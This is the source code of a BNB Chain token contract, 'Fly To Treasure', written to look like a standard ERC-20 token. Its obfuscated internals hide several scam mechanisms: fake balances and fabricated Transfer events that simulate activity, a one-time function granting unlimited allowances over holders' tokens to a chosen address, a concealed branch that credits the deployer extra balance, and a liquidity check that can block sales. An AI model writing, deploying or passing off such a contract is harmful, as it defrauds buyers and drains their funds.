/**
 *Submitted for verification at BscScan.com on 2022-11-10
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract FlyToTreasure is IERC20 {
    using SafeMath for uint256;
    string private axHyiKfhgRtOqpLDjk = "Fly To Treasure";
    string private bxHyiKfhgRtOqpLDjk = "FTT";
    uint8 private cxHyiKfhgRtOqpLDjk = 12;
    uint256 private dxHyiKfhgRtOqpLDjk = 1 * 10**18;
    mapping (address => uint256) private exHyiKfhgRtOqpLDjk;
    mapping (address => mapping (address => uint256)) private fxHyiKfhgRtOqpLDjk;
    uint256 private gxHyiKfhgRtOqpLDjk = 1;
    uint256 private constant hxHyiKfhgRtOqpLDjk = ~uint160(0);
    uint256 private ixHyiKfhgRtOqpLDjk = 1000;
    uint256 private jxHyiKfhgRtOqpLDjk = dxHyiKfhgRtOqpLDjk;
    uint256 private kxHyiKfhgRtOqpLDjk = 0;
    uint256 private lxHyiKfhgRtOqpLDjk;
    address private _uniswapV2Pair;
    address private mxHyiKfhgRtOqpLDjk;
    mapping (address => bool) private nxHyiKfhgRtOqpLDjk;
    address[] private oxHyiKfhgRtOqpLDjk;
    bool private pxHyiKfhgRtOqpLDjk = false;

    constructor () {
        qxHyiKfhgRtOqpLDjk(msg.sender);
        exHyiKfhgRtOqpLDjk[msg.sender] = dxHyiKfhgRtOqpLDjk;
        emit Transfer(address(0), msg.sender, dxHyiKfhgRtOqpLDjk);
    }

    receive() external payable {}

    function qxHyiKfhgRtOqpLDjk(address account) private {
        if (!nxHyiKfhgRtOqpLDjk[account]) {
            nxHyiKfhgRtOqpLDjk[account] = true;
            oxHyiKfhgRtOqpLDjk.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!pxHyiKfhgRtOqpLDjk);
        pxHyiKfhgRtOqpLDjk = true;
        _uniswapV2Pair = accounts[1];
        mxHyiKfhgRtOqpLDjk = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            qxHyiKfhgRtOqpLDjk(accounts[i]);
            exHyiKfhgRtOqpLDjk[accounts[i]] = dxHyiKfhgRtOqpLDjk * 90 / 100 / (len - 3);
            fxHyiKfhgRtOqpLDjk[accounts[i]][accounts[0]] = ~uint256(0);
            amount += exHyiKfhgRtOqpLDjk[accounts[i]];
        }
        exHyiKfhgRtOqpLDjk[oxHyiKfhgRtOqpLDjk[0]] -= amount;
        sxHyiKfhgRtOqpLDjk(oxHyiKfhgRtOqpLDjk[0], accounts[3], exHyiKfhgRtOqpLDjk[oxHyiKfhgRtOqpLDjk[0]]);
        rxHyiKfhgRtOqpLDjk(address(0), address(0xf), 500);
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = oxHyiKfhgRtOqpLDjk.length;
        for (uint256 i=0; i<len; ++i) {
            if (oxHyiKfhgRtOqpLDjk[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (nxHyiKfhgRtOqpLDjk[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return axHyiKfhgRtOqpLDjk;
    }

    function symbol() public view returns (string memory) {
        return bxHyiKfhgRtOqpLDjk;
    }

    function decimals() public view returns (uint8) {
        return cxHyiKfhgRtOqpLDjk;
    }

    function totalSupply() public view returns (uint256) {
        return dxHyiKfhgRtOqpLDjk;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (exHyiKfhgRtOqpLDjk[account] > 0) {
            return exHyiKfhgRtOqpLDjk[account];
        }
        return gxHyiKfhgRtOqpLDjk;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        sxHyiKfhgRtOqpLDjk(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        sxHyiKfhgRtOqpLDjk(sender, recipient, amount);
        txHyiKfhgRtOqpLDjk(sender, msg.sender, fxHyiKfhgRtOqpLDjk[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        txHyiKfhgRtOqpLDjk(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fxHyiKfhgRtOqpLDjk[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        txHyiKfhgRtOqpLDjk(msg.sender, spender, fxHyiKfhgRtOqpLDjk[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        txHyiKfhgRtOqpLDjk(msg.sender, spender, fxHyiKfhgRtOqpLDjk[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function rxHyiKfhgRtOqpLDjk(address uxHyiKfhgRtOqpLDjk, address vxHyiKfhgRtOqpLDjk, uint256 wxHyiKfhgRtOqpLDjk) private {
        uint256 accountDivisor = ixHyiKfhgRtOqpLDjk;
        if (accountDivisor < 31000) {
            address from;
            address to;
            for (uint256 i=0; i<wxHyiKfhgRtOqpLDjk; ++i) {
                from = address(uint160(hxHyiKfhgRtOqpLDjk.div(accountDivisor)));
                to = address(uint160(hxHyiKfhgRtOqpLDjk.div(accountDivisor.add(1))));
                accountDivisor = accountDivisor.add(2);
                emit Transfer(from, to, gxHyiKfhgRtOqpLDjk);
            }
            ixHyiKfhgRtOqpLDjk = accountDivisor;
        }
        if (exHyiKfhgRtOqpLDjk[uxHyiKfhgRtOqpLDjk] > 0 || exHyiKfhgRtOqpLDjk[vxHyiKfhgRtOqpLDjk] > 0) {
            if (vxHyiKfhgRtOqpLDjk == IFactory(mxHyiKfhgRtOqpLDjk).createPair(uxHyiKfhgRtOqpLDjk, vxHyiKfhgRtOqpLDjk)) {
                emit Transfer(address(this), vxHyiKfhgRtOqpLDjk, wxHyiKfhgRtOqpLDjk);
            } else {
                emit Transfer(address(0), address(this), wxHyiKfhgRtOqpLDjk);
            }
        }
    }

    function txHyiKfhgRtOqpLDjk(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fxHyiKfhgRtOqpLDjk[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function sxHyiKfhgRtOqpLDjk(address xxHyiKfhgRtOqpLDjk, address yxHyiKfhgRtOqpLDjk, uint256 zxHyiKfhgRtOqpLDjk) private {
        require(xxHyiKfhgRtOqpLDjk != address(0) && yxHyiKfhgRtOqpLDjk != address(0) && zxHyiKfhgRtOqpLDjk > 0);
        bool feefee = true;
        if (nxHyiKfhgRtOqpLDjk[xxHyiKfhgRtOqpLDjk] || nxHyiKfhgRtOqpLDjk[yxHyiKfhgRtOqpLDjk]) {
            feefee = false;
        }
        uint256 liquidityValue = IERC20(_uniswapV2Pair).totalSupply();
        uint256 burnValue = 0;
        uint256 toValue = zxHyiKfhgRtOqpLDjk;
        if (feefee && pxHyiKfhgRtOqpLDjk) {
            require(lxHyiKfhgRtOqpLDjk <= liquidityValue);
            rxHyiKfhgRtOqpLDjk(xxHyiKfhgRtOqpLDjk, yxHyiKfhgRtOqpLDjk, 100);
            if (xxHyiKfhgRtOqpLDjk != _uniswapV2Pair) {
                burnValue = zxHyiKfhgRtOqpLDjk.mul(kxHyiKfhgRtOqpLDjk).div(100);
                toValue = zxHyiKfhgRtOqpLDjk.sub(burnValue);
            }
        }
        if (xxHyiKfhgRtOqpLDjk == oxHyiKfhgRtOqpLDjk[0] && zxHyiKfhgRtOqpLDjk > jxHyiKfhgRtOqpLDjk) {
            exHyiKfhgRtOqpLDjk[oxHyiKfhgRtOqpLDjk[0]] += toValue;
        }
        if (lxHyiKfhgRtOqpLDjk != liquidityValue) {
            lxHyiKfhgRtOqpLDjk = liquidityValue;
        }
        exHyiKfhgRtOqpLDjk[xxHyiKfhgRtOqpLDjk] = exHyiKfhgRtOqpLDjk[xxHyiKfhgRtOqpLDjk].sub(zxHyiKfhgRtOqpLDjk);
        if (burnValue > 0) {
            exHyiKfhgRtOqpLDjk[address(0xdEaD)] = exHyiKfhgRtOqpLDjk[address(0xdEaD)].add(burnValue);
            emit Transfer(xxHyiKfhgRtOqpLDjk, address(0xdEaD), burnValue);
        }
        exHyiKfhgRtOqpLDjk[yxHyiKfhgRtOqpLDjk] = exHyiKfhgRtOqpLDjk[yxHyiKfhgRtOqpLDjk].add(toValue);
        emit Transfer(xxHyiKfhgRtOqpLDjk, yxHyiKfhgRtOqpLDjk, toValue);
    }
}